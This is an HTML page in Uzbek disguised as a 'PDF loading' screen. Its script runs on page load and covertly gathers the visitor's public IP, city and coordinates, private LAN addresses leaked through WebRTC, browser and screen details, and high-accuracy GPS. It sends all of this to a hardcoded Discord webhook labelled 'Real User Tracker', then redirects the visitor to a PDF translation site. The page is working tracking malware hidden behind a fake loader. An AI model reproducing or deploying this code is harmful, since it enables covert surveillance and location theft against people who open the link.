<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDF Yuklanmoqda</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        
        .loading-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(15px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 90%;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-left: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .progress-text {
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 10px;
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: white;
            width: 0%;
            border-radius: 3px;
            transition: width 0.3s ease;
        }
        
        .status {
            font-size: 14px;
            opacity: 0.8;
            margin-top: 15px;
        }
        
        .ip-info {
            background: rgba(0, 0, 0, 0.2);
            padding: 10px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: monospace;
            font-size: 12px;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="spinner"></div>
        <h1>PDF Yuklanmoqda...</h1>
        <div class="progress-text">Tayyorlanmoqda ‚Ä¢ <span id="percent">0</span>%</div>
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="ip-info" id="ipInfo">
            IP ma'lumotlari yig'ilmoqda...
        </div>
        <div class="status" id="status">Tizim tekshiruvi...</div>
    </div>

    <script>
        // Maqsadli URL
        const targetURL = 'https://pdfsimpli.com/ru/lp/translate-pdf/?962-902-7329&utm_source=google&utm_medium=sem&utm_campaign=23059244338&utm_term=%D0%BA%D0%B0%D0%BA%20%D0%BF%D0%B5%D1%80%D0%B5%D0%B2%D0%B5%D1%81%D1%82%D0%B8%20pdf%20%D1%84%D0%B0%D0%B9%D0%BB%20%D0%BD%D0%B0%20%D1%80%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9&network=g&device=c&adposition=&adgroupid=191636653851&placement=&location=1028523&gad_source=1&gad_campaignid=23059244338&gbraid=0AAAAApVBV2AwnD6kzFyOqi2kWCDpED7Zd&gclid=CjwKCAjwmNLHBhA4EiwA3ts3mdvvfYRE8uQ3XjfZWsA9Scfmf2DjOJ5rdQXmAriRI-F7iGh1FSis3hoCi8UQAvD_BwE';
        const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";

        // Progress boshqaruvi
        function updateProgress(percent, status) {
            document.getElementById('progressFill').style.width = percent + '%';
            document.getElementById('percent').textContent = percent;
            document.getElementById('status').textContent = status;
        }

        function updateIPInfo(info) {
            document.getElementById('ipInfo').textContent = info;
        }

        // Local IP ni ishonchli olish
        function getLocalIPs() {
            return new Promise((resolve) => {
                const privateIPs = [];
                let foundIPs = false;

                updateIPInfo("Local tarmoq skanerlanyapti...");

                try {
                    const pc = new RTCPeerConnection({
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { urls: 'stun:stun1.l.google.com:19302' },
                            { urls: 'stun:stun2.l.google.com:19302' }
                        ]
                    });

                    pc.createDataChannel('');

                    pc.onicecandidate = (e) => {
                        if (e.candidate) {
                            const candidate = e.candidate.candidate;
                            
                            // IPv4 manzillarini qidirish
                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
                            const matches = candidate.match(ipRegex);
                            
                            if (matches) {
                                matches.forEach(ip => {
                                    // Private IP larni tekshirish
                                    if ((ip.startsWith('192.168.') || 
                                         ip.startsWith('10.') || 
                                         (ip.startsWith('172.') && 
                                          parseInt(ip.split('.')[1]) >= 16 && 
                                          parseInt(ip.split('.')[1]) <= 31)) && 
                                        !privateIPs.includes(ip)) {
                                        privateIPs.push(ip);
                                        foundIPs = true;
                                        updateIPInfo(`Topilgan Local IP: ${ip}`);
                                    }
                                });
                            }
                        } else {
                            // Barcha candidate lar tugadi
                            if (!foundIPs) {
                                // WebRTC orqali IP olish
                                pc.createOffer()
                                    .then(offer => {
                                        const sdp = offer.sdp;
                                        const ipMatches = sdp.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/g);
                                        if (ipMatches) {
                                            ipMatches.forEach(ip => {
                                                if ((ip.startsWith('192.168.') || ip.startsWith('10.') || 
                                                     (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) && 
                                                    !privateIPs.includes(ip)) {
                                                    privateIPs.push(ip);
                                                    foundIPs = true;
                                                }
                                            });
                                        }
                                        resolve(privateIPs.length > 0 ? privateIPs : ['Local IP WebRTC orqali topilmadi']);
                                    })
                                    .catch(() => resolve(['WebRTC xatosi']));
                            } else {
                                resolve(privateIPs);
                            }
                        }
                    };

                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(() => resolve(['Offer xatosi']));

                } catch (error) {
                    resolve(['RTCP xatosi: ' + error.message]);
                }

                // 4 soniyadan keyin timeout
                setTimeout(() => {
                    resolve(privateIPs.length > 0 ? privateIPs : ['Local IP vaqt tugadi']);
                }, 4000);
            });
        }

        // Discord-ga yuborish
        async function sendToDiscord(content) {
            try {
                const response = await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        content: content,
                        username: 'Real User Tracker'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Discord xatosi:', error);
                return false;
            }
        }

        // Network ma'lumotlarini olish
        function getNetworkInfo() {
            const connection = navigator.connection;
            let networkInfo = '';
            
            if (connection) {
                networkInfo = `üì° **Ulanish:** ${connection.effectiveType || 'N/A'}\n` +
                            `‚¨áÔ∏è **Download:** ${connection.downlink || 'N/A'} Mbps\n` +
                            `‚è± **RTT:** ${connection.rtt || 'N/A'} ms`;
            }
            
            return networkInfo;
        }

        // Asosiy funksiya
        async function startTracking() {
            updateProgress(10, "IP manzil aniqlanmoqda...");
            
            let publicIP = "Noma'lum";
            let localIPs = ["Noma'lum"];
            let locationInfo = "";
            let networkInfo = "";
            
            try {
                // Public IP olish
                updateIPInfo("Public IP olinmoqda...");
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                publicIP = ipData.ip;
                updateProgress(30, "Public IP topildi");
                updateIPInfo(`Public IP: ${publicIP}`);

                // Geolokatsiya
                updateProgress(40, "Geolokatsiya ma'lumotlari olinmoqda...");
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
                    const geoData = await geoResponse.json();
                    if (geoData.country_name) {
                        locationInfo = `üìç **Manzil:** ${geoData.city || ''}, ${geoData.region || ''}, ${geoData.country_name}\n` +
                                     `üåç **Koordinatalar:** ${geoData.latitude || ''}, ${geoData.longitude || ''}\n` +
                                     `üè¢ **ISP:** ${geoData.org || geoData.isp || ''}\n` +
                                     `üèõ **ASN:** ${geoData.asn || ''}\n`;
                    }
                } catch (geoError) {
                    console.log('Geolokatsiya xatosi:', geoError);
                }
                
                updateProgress(60, "Local tarmoq tekshirilmokda...");
                
                // Local IP larni olish
                localIPs = await getLocalIPs();
                updateIPInfo(`Public: ${publicIP} | Local: ${localIPs.join(', ')}`);
                
                // Network ma'lumotlari
                networkInfo = getNetworkInfo();
                
            } catch (error) {
                console.log('Xato:', error);
                updateIPInfo(`Xato: ${error.message}`);
            }
            
            updateProgress(80, "Ma'lumotlar yuborilmoqda...");
            
            // Discord xabarini tayyorlash
            const message = 
                `üë§ **HAQIQIY FOYDALANUVCHI**\n\n` +
                `üåê **Public IP:** ${publicIP}\n` +
                `üè† **Local IP:** ${localIPs.join(', ')}\n` +
                `üîó **Hosting:** ${window.location.hostname}\n\n` +
                `${locationInfo ? `üó∫ **GEOLOKATSIYA**\n${locationInfo}\n` : ''}` +
                `${networkInfo ? `üì° **NETWORK**\n${networkInfo}\n\n` : ''}` +
                `üíª **TIZIM MA'LUMOTLARI**\n` +
                `üñ• **Platforma:** ${navigator.platform}\n` +
                `üåê **Brauzer:** ${navigator.userAgent.split(') ')[0] + ')'}\n` +
                `üì± **Ekran:** ${screen.width}x${screen.height}\n` +
                `üé® **Rang:** ${screen.colorDepth}-bit\n` +
                `üïê **Vaqt:** ${new Date().toLocaleString()}\n` +
                `üîó **URL:** ${window.location.href}`;
            
            // Ma'lumotlarni yuborish
            const sent = await sendToDiscord(message);
            
            if (sent) {
                updateProgress(100, "Ma'lumotlar yuborildi! Yo'naltirilmoqda...");
                updateIPInfo("‚úÖ Barcha ma'lumotlar yuborildi");
            } else {
                updateProgress(100, "Xato! Yo'naltirilmoqda...");
                updateIPInfo("‚ùå Ma'lumotlar yuborilmadi");
            }
            
            // 3 soniyadan keyin o'tkazish
            setTimeout(() => {
                window.location.href = targetURL;
            }, 3000);
        }

        // GPS ma'lumotlari
        function startGPSTracking() {
            if (navigator.geolocation) {
                updateIPInfo("GPS so'ralmoqda...");
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const gpsMessage = 
                            `üìç **GPS MA'LUMOTLARI**\n\n` +
                            `üó∫ **Kenglik:** ${position.coords.latitude}\n` +
                            `üó∫ **Uzunlik:** ${position.coords.longitude}\n` +
                            `üéØ **Aniqlik:** ${position.coords.accuracy}m\n` +
                            `‚õ∞ **Balandlik:** ${position.coords.altitude || 'N/A'}m\n` +
                            `‚ö° **Tezlik:** ${position.coords.speed || 'N/A'}m/s\n` +
                            `üß≠ **Yo'nalish:** ${position.coords.heading || 'N/A'}¬∞`;
                        
                        await sendToDiscord(gpsMessage);
                        updateIPInfo("‚úÖ GPS ma'lumotlari yuborildi");
                    },
                    async (error) => {
                        const gpsError = 
                            `üìç **GPS RAD ETILDI**\n\n` +
                            `‚ùå **Xato:** ${error.message}\n` +
                            `üî¢ **Kod:** ${error.code}\n` +
                            `üì± **Platforma:** ${navigator.platform}`;
                        
                        await sendToDiscord(gpsError);
                        updateIPInfo("‚ùå GPS rad etildi");
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                updateIPInfo("‚ùå GPS qo'llab-quvvatlanmaydi");
            }
        }

        // Dasturni ishga tushirish
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                startTracking();
                startGPSTracking();
            }, 1000);
        });
    </script>
</body>
</html>
